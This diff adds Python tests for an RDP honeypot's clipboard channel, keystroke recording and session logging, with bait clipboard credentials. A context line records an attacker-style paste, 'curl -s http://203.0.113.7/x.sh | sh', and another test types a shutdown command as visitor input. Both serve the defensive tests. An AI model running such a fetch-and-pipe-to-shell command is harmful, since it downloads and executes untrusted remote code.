@@ -749,3 +749,182 @@ async def test_a_real_client_pasting_into_the_session_is_recorded(tmp_path, monk
         assert session.payload["clipboard"] == ["curl -s http://203.0.113.7/x.sh | sh"]
     finally:
         await engine.stop(container)
+
+
+# ── clipboard offered back ───────────────────────────────────────────────────
+
+
+async def test_an_offered_clipboard_is_announced_after_the_clients_first_list_then_served():
+    import struct
+
+    from honeypot_mcp.engines.rdp_cliprdr import ClipboardChannel
+
+    channel = ClipboardChannel("backup password: see \x1b[31mvault")
+    assert [struct.unpack_from("<H", m)[0] for m in channel.opening()] == [7, 1]  # caps, ready
+    # Announced only once the client's own initial Format List has been answered; before that a
+    # real client (aardwolf, mstsc) ignores everything but the Format List Response.
+    replies = channel.feed(_as_chunk(_format_list(13)))
+    assert [struct.unpack_from("<H", m)[0] for m in replies] == [3, 4]  # accepted, asked for text
+    # The server's own list follows the answer to that request: sent alongside it, it would claim
+    # clipboard ownership and cancel the request still in flight.
+    after = channel.feed(
+        _as_chunk(_clip_message(5, 1, "first paste".encode("utf-16-le") + b"\x00\x00"))
+    )
+    assert [struct.unpack_from("<H", m)[0] for m in after] == [2]
+    assert struct.unpack_from("<I", after[0], 8)[0] == 13  # Unicode text
+    assert channel.texts == ["first paste"]
+    again = channel.feed(_as_chunk(_format_list(13)))
+    assert [struct.unpack_from("<H", m)[0] for m in again] == [3, 4]  # announced once only
+
+    [reply] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 13))))
+    assert struct.unpack_from("<HH", reply) == (5, 1)  # data response, OK
+    assert reply[8:].decode("utf-16-le").rstrip("\x00") == "backup password: see ?[31mvault"
+    [ansi] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 1))))
+    assert ansi[8:].endswith(b"\x00") and b"backup password" in ansi
+    assert channel.offer_reads == 2
+    [refused] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 0xC001))))
+    assert struct.unpack_from("<HH", refused) == (5, 2)  # a format it never announced
+
+
+async def test_without_an_offer_nothing_is_announced_and_requests_are_refused():
+    import struct
+
+    from honeypot_mcp.engines.rdp_cliprdr import MAX_OFFER_CHARS, ClipboardChannel
+
+    plain = ClipboardChannel()
+    assert len(plain.opening()) == 2 and plain.offer_reads == 0
+    [reply] = plain.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 13))))
+    assert struct.unpack_from("<HH", reply) == (5, 2)
+    assert len(ClipboardChannel("x" * 5000).offer or "") == MAX_OFFER_CHARS
+
+
+async def test_a_real_client_pulls_the_offered_clipboard_and_the_session_says_so(
+    tmp_path, monkeypatch
+):
+    from aardwolf.extensions.RDPECLIP.channel import RDPECLIPChannel
+
+    engine, container, port = await _serve(
+        tmp_path, monkeypatch, {"clipboard_text": "svc-backup / Winter2026!"}
+    )
+    try:
+        user, password = _weak()
+        connection, error = await _connect(
+            port, user, password, nla=True, channels=[RDPECLIPChannel]
+        )
+        assert error is None, error
+        received = None
+        for _ in range(40):  # aardwolf requests a server's text on its own
+            await asyncio.sleep(0.25)
+            while not connection.ext_out_queue.empty():
+                item = connection.ext_out_queue.get_nowait()
+                if getattr(item, "data", None) == "svc-backup / Winter2026!":
+                    received = item
+            if received:
+                break
+        await connection.terminate()
+        assert received is not None, "the client never received the offered clipboard"
+        [session] = await _events("rdp_session")
+        assert session.payload["clipboard_offer_read"] >= 1
+    finally:
+        await engine.stop(container)
+
+
+async def test_a_bug_in_the_desktop_still_leaves_a_session_record(monkeypatch):
+    """If rendering or the shell ever raises, the visitor's session summary (what they typed up
+    to then) must still be produced, not lost with the exception."""
+    from honeypot_mcp.engines import rdp_desktop
+
+    def boom(self, actions, now=None):
+        raise RuntimeError("bug in the desktop")
+
+    monkeypatch.setattr(rdp_desktop.Desktop, "apply", boom)
+    stream = _client_frames(font_lists=1)
+    # a few keystrokes after the handshake: an Input PDU with scancode events
+    import struct
+
+    from honeypot_mcp.engines.rdp_session import CLIENT_USER, IO_CHANNEL, per_length
+
+    def key(code: int) -> bytes:
+        return struct.pack("<IHHHH", 0, 0x0004, 0, code, 0)
+
+    events = b"".join(key(c) for c in (0x11, 0x23, 0x18))  # w h o
+    payload = struct.pack("<HH", 3, 0) + events
+    body = struct.pack("<IBBHBBH", 0x103EA, 0, 1, len(payload) + 4, 0x1C, 0, 0) + payload
+    pdu = struct.pack("<HHH", len(body) + 6, 0x17, CLIENT_USER) + body
+    mcs = (
+        b"\x64"
+        + struct.pack(">HH", CLIENT_USER - 1001, IO_CHANNEL)
+        + b"\x70"
+        + per_length(len(pdu))
+        + pdu
+    )
+    frame = b"\x03\x00" + struct.pack(">H", len(mcs) + 7) + b"\x02\xf0\x80" + mcs
+    result, _written, _ = await _run_hostile_client(stream + frame)
+    assert result["ended_by"] == "internal error"
+    assert result["stage"] == "active" and result["typed"] == "who"
+
+
+# ── second review: input ────────────────────────────────────────────────────
+
+
+def test_ctrl_and_alt_combinations_are_not_typed_text_and_a_lost_win_key_up_recovers():
+    from honeypot_mcp.engines.rdp_session import InputRecorder
+
+    recorder = InputRecorder()
+    down, up = 0x0000, 0x8000
+    for flags, code in [
+        (down, 0x1D), (down, 0x2F), (up, 0x2F), (up, 0x1D),  # Ctrl+V
+        (down, 0x1D), (down, 0x2E), (up, 0x2E), (up, 0x1D),  # Ctrl+C
+        (down, 0x38), (down, 0x0F), (up, 0x0F), (up, 0x38),  # Alt+Tab
+    ]:  # fmt: skip
+        recorder.on_scancode(flags, code)
+    assert recorder.take_actions() == [("special", "ctrl+v"), ("special", "ctrl+c")]
+    assert recorder.summary()["typed"] == ""
+
+    recorder.on_scancode(down, 0x5B)  # Win goes down and its key-up is lost
+    recorder.on_scancode(down, 0x1E)
+    assert recorder.take_actions() == []  # swallowed as a Win combination...
+    recorder.on_sync()  # ...until the client regains focus
+    recorder.on_scancode(down, 0x1E)
+    assert recorder.take_actions() == [("char", "a")]
+
+
+def test_ctrl_v_pastes_the_visitors_clipboard_line_by_line():
+    from honeypot_mcp.engines.rdp_session import _expand_paste
+
+    expanded = _expand_paste(
+        [("char", "x"), ("special", "ctrl+v"), ("char", "y")], "whoami\r\nhostname\x1b"
+    )
+    assert "".join(a[1] for a in expanded) == "xwhoami\nhostname" + "y"  # control chars dropped
+    assert len(_expand_paste([("special", "ctrl+v")], "z" * 5000)) == 500
+
+
+async def test_shutdown_from_the_console_ends_the_session_and_says_so():
+    """Typing `shutdown /r` takes the machine, and so the connection, away: the session ends
+    with a record saying the visitor logged off, as the real thing would drop them."""
+    import struct
+
+    from honeypot_mcp.engines import rdp_session as rs
+
+    letters = {lower: code for code, (lower, _upper) in rs._KEYS.items()}
+
+    def keys(text: str) -> list[tuple[int, int]]:
+        return [(0, letters[c]) for c in text]
+
+    sequence = [(0, 0x5B), (0, 0x13), (0x8000, 0x13), (0x8000, 0x5B)]  # Win+R
+    sequence += keys("shutdown /r /t 0\n")
+    events = b"".join(struct.pack("<IHHHH", 0, 0x0004, flags, code, 0) for flags, code in sequence)
+    payload = struct.pack("<HH", len(sequence), 0) + events
+    body = struct.pack("<IBBHBBH", 0x103EA, 0, 1, len(payload) + 4, 0x1C, 0, 0) + payload
+    pdu = struct.pack("<HHH", len(body) + 6, 0x17, rs.CLIENT_USER) + body
+    mcs = (
+        b"\x64"
+        + struct.pack(">HH", rs.CLIENT_USER - 1001, rs.IO_CHANNEL)
+        + b"\x70"
+        + rs.per_length(len(pdu))
+        + pdu
+    )
+    frame = b"\x03\x00" + struct.pack(">H", len(mcs) + 7) + b"\x02\xf0\x80" + mcs
+    result, _written, _ = await _run_hostile_client(_client_frames(font_lists=1) + frame)
+    assert result["ended_by"] == "visitor logged off"
+    assert result["commands"] == [{"shell": "run", "input": "shutdown /r /t 0"}]
